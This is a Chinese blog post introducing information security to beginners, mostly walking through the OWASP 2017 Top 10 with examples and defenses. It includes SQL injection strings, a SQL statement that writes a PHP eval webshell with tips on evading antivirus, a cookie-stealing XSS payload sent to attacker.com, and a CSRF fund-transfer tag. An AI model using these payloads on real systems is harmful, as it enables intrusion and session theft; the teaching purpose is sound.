---
title: 信息安全学习入门
date: 2018-09-10 21:41:53
tags: [安全,技术,杂谈]
---

因为一直有人和我说，想学习安全，想入门。这个东西其实讲起来也比较多，用手机或电脑打字讲也很麻烦，因为人的人比较多，我还是在这里写一篇文章统一介绍一下吧。

本文面向的对象是有一定计算机基础的安全初学者，大多数内容全靠个人印象和理解，临时写的文章，暂时还没有校对检查，大佬们手下留情，如果有错误还请指出。

<!--more-->

## 网络安全法

这个我就不说了，放在最前面。

## 什么是安全

安全包括很多方面，我在这里把它概括为2大主要方面：渗透（网络）和逆向（二进制）。当然，安全的方向有很多，还有密码（加密解密）、硬件（硬件破解方面）、无线（Wifi等）、取证、隐写等，但目前主要还是渗透和逆向两大主要方向。这篇文章主要还是针对渗透和逆向来讲，其它方面会略微提及，但不至于特别深入。

### 渗透

什么是渗透？通俗的来说，就是黑网站黑服务器进内网拿权限，就是大多数意义上的黑客行为。渗透入门简单，门槛较低，上手快，但深入也不容易。

### 逆向

什么是逆向？通俗的说，就是软件的破解。各种软件汉化破解基本上都离不开逆向。逆向相比渗透来说门槛高，要求对汇编语言C语言，系统的一些底层原理有所了解。

### 其它

密码就没什么好说的了，就是加密解密，应该都懂。加密解密方式有很多种，如果想深入了解可以查一下各种算法。目前主要的加密算法也有很多，AES、RSA等等等。

硬件的基础其实也离不开逆向，主要是针对一些硬件设备的操作。比如无人机的破解、共享单车的破解、IC卡破解等等等。

无线目前大多数针对的是Wifi的攻击，目前主要还是中间人（黑客在你上网时拦截你的上网请求，可以窃取你的访问凭证或者类似窃听的查看你的网络请求）等攻击比较常见。

取证是什么，就是你搞完人家的服务器了，人家通过取证把你的记录找出来顺着网线打回去或者直接报警。

隐写就是你看着是一张图片、一首歌，其实里面隐藏着一些你不知道的数据或信息。

## 渗透

大多数人想学习安全都是想学习渗透。黑客诶，真鸡儿酷炫。

俗话说，有人的地方就有江湖，有网站的地方就有漏洞。漏洞的种类有很多，这里介绍OWASP2017的TOP10漏洞。

### OWASP Top 10 应用安全风险–2017

1. 注入

   > 注入攻击漏洞，例如SQL，OS以及LDAP注入。这些攻击发生在当不可信的数据作为命令或者查询语句的一部分，被发送给解释器的时候。攻击者发送的恶意数据可以欺骗解释器，以执行计划外的命令或者在未被恰当授权时访问数据。

2. 失效的身份认证和会话管理

   > 与身份认证和回话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击者攻击者破坏密码、密钥、会话令牌或攻击其他的漏洞去冒充其他用户的身份（暂时或永久的）。

3. 跨站脚本（XSS）

   > 当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它发送给一个网页浏览器，或者使用可以创建javaScript脚本的浏览器API利用用户提供的数据更新现有网页，这就会产生跨站脚本攻击。XSS允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话、危害网站或者将用户重定向到恶意网站。

4. 失效的访问控制

   > 对于通过认证的用户所能够执行的操作，缺乏有效的限制。攻击者就可以利用这些缺陷来访问未经授权的功能和/或数据，例如访问其他用户的账户，查看敏感文件，修改其他用户的数据，更改访问权限等。

5. 安全配置错误

   > 好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于许多设置的默认值并不是安全的，因此，必须定义、实施和维护这些设置。此外，所有的软件应该保持及时更新。

6. 敏感信息泄露

   > 许多web应用程序和API没有正确保护敏感数据，如财务、医疗保健和PII。攻击者可能会窃取或篡改此类弱保护的数据，进行信用卡欺骗、身份窃取或其他犯罪行为。敏感数据应该具有额外的保护，例如在存放或在传输过程中的加密，以及与浏览器交换时进行特殊的预防措施。

7. 攻击检测与防护不足

   > 大多数应用和API缺乏检测、预防和响应手动或自动化攻击的能力。攻击保护措施不限于基本输入验证，还应具备自动检测、记录和响应，甚至阻止攻击的能力。应用所有者还应能够快速部署安全补丁以防御攻击。

8. 跨站请求伪造（CSRF）

   > 一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求，包括受害者的会话cookie和所有其他自动填充的身份认证信息，发送到一个存在漏洞的web应用程序。这种攻击允许攻击迫使受害者的浏览器生成让存在漏洞的应用程序认为是受害者的合法请求的请求。

9. 使用含有已知漏洞的组件

   > 组件，比如：库文件、框架和其他软件模块，具有与应用程序相同的权限。如果一个带有漏洞的组件被利用，这种攻击可以促成严重的数据丢失或服务器接管。应用程序和API使用带有已知漏洞的组件可能会破坏应用程序的防御系统，并使一系列可能的攻击和影响成为可能。

10. 未受有效保护的API

    > 现代应用程序通常涉及丰富的客户端应用程序和API，如：浏览器和移动APP中的JavaScript，其与某类API(SOAP/XML、REST/JSON、RPC、GWT等）连接。这些API通常是不受保护的，并且包含许多漏洞。

这里，我会用一些较为通俗的语言介绍一下上面的这10条

#### 注入

注入是目前为止危害最大的一种安全问题了，漏洞多，范围广，危害大。可以这么说，如果使用了数据库，就有导致SQL注入的危险。

好好想想，你们有没有这样写过代码：

```sql
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") +"'";
```

或者更直接的，这样：

```sql
string a="select * from user where username='admin' and password='"+password+"';";
```

想想，这会导致什么问题？

对于第一个SQL语句，我们这样请求

```
http://example.com/app/accountView?id=' or '1'='1
```

那么实际执行的语句是

```sql
SELECT * FROM accounts WHERE custID='' or '1'='1'
```

这样会导致绕过你写的SQL语句，以黑客自己的意思执行SQL语句。

对于第二个SQL语句，我们这样请求

```
password=pass' and '1'='1
password=pass' and '1'='2
……
```

那么实际执行的语句是

```sql
select * from user where username='admin' and password='pass' and '1'='1';
select * from user where username='admin' and password='pass' and '1'='2';
……
```

你可以任意构造你的SQL语句。大多数时候的数据库权限还挺高的。完全可以通过数据库的select的语句写shell，比如写一个一句话木马：

```sql
Select '<? php eval($_POST[cmd]);?>' into outfile 'F:/wwwroot/eval.php';
```

什么是一句话木马？

一句话又称为小马，通过一个叫中国菜刀的工具（类似工具还有蚁剑等）就可以连接这种木马，因为简单的木马只需要一句话`<? php eval($_POST[pass]);?>`故称为一句话木马。虽然只有一句话，但可以通过软件实现目录读取、任意命令执行、数据库读取等功能。当然，这么简单很容易被现在的杀软杀掉，怎么重新构造这一句话就看你的技术了。

相对应的就是Web大马，区别于一句话需要额外的软件配合，大马一般都是一个独立的文件，可以直接在浏览器中以网页的形式执行相关类似的功能。

两者各有各的好处。

再说回SQL注入，防止注入漏洞需要将不可信数据从命令及查询中区分开。

1.最佳选择是使用安全的API，完全避免使用解释器或提供参数化界面的API。但要注意有些参数化的API，比如存储过程（stored procedures），如果使用不当，仍然可以引入注入漏洞。

2.如果没法使用一个参数化的API，那么你应该使用解释器具体的escape语法来避免特殊字符。

3.使用正面的或“白名单”的具有恰当的规范化的输入验证方法同样会有助于防止注入攻击。但由于很多应用在输入中需要特殊字符，这一方法不是完整的防护方法。

因为SQL语句可以写的很骚，所以说注入这里其实是很有意思的。

如果想深入学习SQL注入，我推荐一本书《SQL注入攻击与防御》。

#### 失效的身份认证和会话管理

在OWASP2017中的场景有这么3个

```
场景#1：机票预订应用程序支持URL重写，把会话ID放在URL里：
http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii
该网站一个经过认证的用户希望让他朋友知道这个机票打折信息。他将上面链接通过邮件发给他朋友们，并不知道自己已经泄漏了自己的会话ID。当他的朋友们使用上面的链接时，他们将会使用他的会话和信用卡。
场景#2：应用程序超时设置不当。用户使用公共计算机访问网站。离开时，该用户没有点击退出，而是直接关闭浏览器。攻击者在一个小时后能使用相同浏览器通过身份认证。盐
场景#3：内部或外部攻击者进入系统的密码数据库。存储在数据库中的用户密码没有被哈希和加盐, 所有用户的密码都被攻击者获得。
```

导致这一漏洞的主要原因有如下几条：

1.用户身份验证凭证没有使用哈希或加密保护。

2.认证凭证可猜测，或者能够通过薄弱的的帐户管理功能（例如账户创建、密码修改、密码恢复, 弱会话ID）重写。

3.会话ID暴露在URL里（例如, URL重写）。

4.会话ID容易受到会话固定（session fixation）的攻击。

5.会话ID没有超时限制，或者用户会话或身份验证令牌特别是单点登录令牌在用户注销时没有失效。

6.成功注册后,会话ID没有轮转。

7.密码、会话ID和其他认证凭据使用未加密连接传输。

#### 跨站脚本（XSS）

XSS也是一个很常见的漏洞了。目前主要有2种XSS：

（1）反射型： 发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS随响应内容一起返回给浏览器，最后浏览器解析执行XSS代码，这个过程就像一次发射，所以叫反射型XSS。

（2）存储型: 存储型XSS和反射型的XSS差别就在于，存储型的XSS提交的代码会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。

我举这么一个存储型的栗子：

某网站有一个留言板，表单是这么写的：

```html
<input type=“text” name=“content” value=“这里是用户填写的数据”>
```

那么我在value里写

```html
<script>alert('1')</script>
```

那么一旦提交保存到数据库里，所有看到我的这条留言的用户网页上都会弹个窗。

OWASP2017的场景为：

```
应用程序在下面HTML代码段的构造中使用未经验证或转义的不可信的数据：
（String）page+="<inputname='creditcard'type='TEXT‘value='"+request.getParameter（"CC"）+"'>";
攻击者在浏览器中修改“CC”参数为如下值：
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
这个攻击导致受害者的会话ID被发送到攻击者的网站，使得攻击者能够劫持用户当前会话。
```

XSS也会导致CSRF，当然这两者很相似，CSRF在后面说。（还有一个SSRF，和CSRF一起说）

#### 失效的访问控制

这个主要还是权限的问题。

以OWASP中的场景为例：

```
场景#1：应用程序在访问帐户信息的SQL调用中使用未验证数据：
pstmt.setString( 1, request.getParameter("acct"));
ResultSetresults = pstmt.executeQuery( );
攻击者能轻易在浏览器中将“acct”参数修改成他所想要的任何账户号码。如果应用程序没有进行恰当的验证，攻击者就能访问任何用户的账户，而不仅仅是该目标用户的账户。
http://example.com/app/accountInfo?acct=notmyacct
场景#2：攻击者能轻易强制浏览器访问目标URLs。管理员权限也需要访问管理页面。
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
如果一个未经认证的的用户能访问这两个页面，说明存在漏洞。
如果非管理员能够访问admin页面，也说明存在漏洞。
```

我这里提一下我之前挖到的一个腾讯的高危漏洞，就是权限控制不当，通过修改cookie里的uin字段就可以轻易获取任意用户信息。通常这个漏洞也成为未授权访问。

#### 安全配置错误

就是如题所说，配置错误。

OWASP场景：

```
场景#1：应用程序服务器管理员控制台自动安装后没有被删除。而默认帐户也没有被改变。攻击者在你的服务器上发现了标准的管理员页面，通过默认密码登录，从而接管了你的服务器。
场景#2：目录列表在你的服务器上未被禁用。攻击者发现只需列出目录，她就可以找到你服务器上的任意文件。攻击者找到并下载所有已编译的Java类，她通过反编译获得了所有你的自定义代码。然后，她在你的应用程序中找到一个访问控制的严重漏洞。
场景#3：应用服务器配置允许堆栈跟踪信息返回给用户，这样就暴露了潜在的漏洞。如已知的有漏洞的框架版本。
场景#4：应用服务器自带的示例应用程序没有从您的生产服务器中删除。该示例应用有已知安全漏洞，攻击者可以利用这些漏洞破坏您的服务器。
```

没什么好说的，配置问题。

#### 敏感信息泄漏

OWASP场景：

```
场景#1：一个应用程序加密存储在数据库的信用卡信息，以防止信用卡信息暴露给最终用户。但是，数据库设置为对信用卡表列的查询进行自动解密，这就使得SQL注入漏洞能够获得所有信用卡信息的明文。备选方案包括不存储信用卡号码，使用标记化或使用公钥加密。
场景#2：一个网站上所有需要身份验证的网页都没有使用TLS。攻击者只需监控网络数据流（比如一个开放的无线网络），并窃取一个已验证的受害者的session cookie。然后，攻击者利用这个cookie执行重放攻击并接管用户的会话从而访问用户的隐私数据。
场景#3：密码数据库使用未加盐的哈希算法去存储每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所有这些未加盐哈希的密码通过彩虹表暴力破解方式破解。
```

目前，敏感信息泄露来源有很多。目前，Github等平台也成为了泄露的主要来源之一。前几天的华住数据泄露就传说是程序员把数据库连接及用户密码上传到了Github，被脱库。

现在我手里也有几个网站的信息泄露，无话可说，全站源码泄露==。

#### 应对攻击防护不足

OWASP场景：

```
场景#1：攻击者利用自动化工具如OWASP ZAP或SQLMap来检测和利用漏洞。
攻击检测应该识别出应用程序正在遭受着异常请求和大流量攻击，对于自动化扫描也很容易的和正常流量区分开。
场景#2：熟练的攻击者小心的探测着可能存在的漏洞，最终发现哪些隐藏的漏洞。
然而这类攻击可能包含着正常用户从不会发送的一些请求，如禁止在界面上输入的内容，很难被检测到。跟踪这类攻击需些时间创建一些用以阐明恶意企图的用例。
场景#3：攻击者已经开始利用你应用系统中的一个漏洞，而你当前的攻击检测未能阻止。
```

简而言之就是有人攻击你了，你能不能发现攻击并及时阻止。

#### 跨站请求伪造（CSRF）

CSRF和XSS类似。CSRF主要是你把你构造好的包含恶意代码的链接发给目标后，目标通过访问或其他手段触发，在目标的客户端上以目标身份执行恶意代码。

OWASP场景：

```
应用程序允许用户提交不包含任何保密字段的状态改变请求，如：
http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243
因此，攻击者构建一个请求，用于将受害用户账户中的现金转移到自己账户。然后攻击者在其控制的多个网站中以图片请求或iframe中嵌入这种攻击。
<imgsrc="http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#“width="0" height="0" />
如果受害用户通过了example.com认证，则伪造的请求将自动包含用户的会话信息，授权执行攻击者的请求。
```

简而言之，就是你电脑上登录了a网站，他发给你B网站的链接，但是里面包含了相关a网站的恶意链接，即使a网站没有恶意代码，但通过这种手段依然可以通过B网站获取到a网站的相关数据。

刚刚前面XSS提到了SSRF，这里也说一下

SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。 

简单的说，就是让服务器执行你的恶意代码。

关于SSRF这里有一篇文章写的很详细，我就不详细说了。[SSRF学习之路](http://www.freebuf.com/column/157466.html) 



#### 使用含有已知漏洞的组件

没什么说的，没好好打补丁，被搞活该。

#### 未受有效保护的API

OWASP场景：

```
场景#1：想像一下有一个银行移动APP，通过访问XML API来访问账户信息，进行交易操作。攻击着逆向分析了移动APP，发现登录请求中，银行账号和用户名、密码一起发送给了服务器端的API。攻击者篡改发送了一个带着有效用户名、密码的登录请求，但是银行账号确实别人的，通过这个请求，成功登录，然后完全控制别人的银行账号
场景#2：有一个互联网创业公司提供了一个公开的API，用以自动发送短消息。这个API接受JSON格式的请求，其中有transactionid参数。API把transactionid作为字符串来解析，然后拼接到SQL查询里，没有做任何参数化或者转义。所以这里的API和其他应用一样会受到SQL注入攻击
```

简单的说，就是API不安全。通过不安全的API可以获取很多非法数据。

### 人的问题

不得不提一下社会工程学。你可以把社会工程学理解为一种与人打交道的技术。

即使企业的安全做的很好，外部攻击很难进入，但是内部大多数很弱，通过一两个内部人员可以很轻易的突破防线进入。

一说社会工程学，就不得不说凯文·米特尼克，这个人有多厉害你们百度一下就知道了。总之，就是神~他的社工技术就特别强。

## 逆向

等待更新

## CTF相关

等更新

## 学习资源推荐

[安全类导航 渗透师](https://www.shentoushi.top/)

[FreeBuf](http://www.freebuf.com/)  [T00ls](https://www.t00ls.net/)  [安全客](https://www.anquanke.com/)  

[看雪](https://www.kanxue.com/)  [吾爱破解](https://52pojie.cn)

后面等更新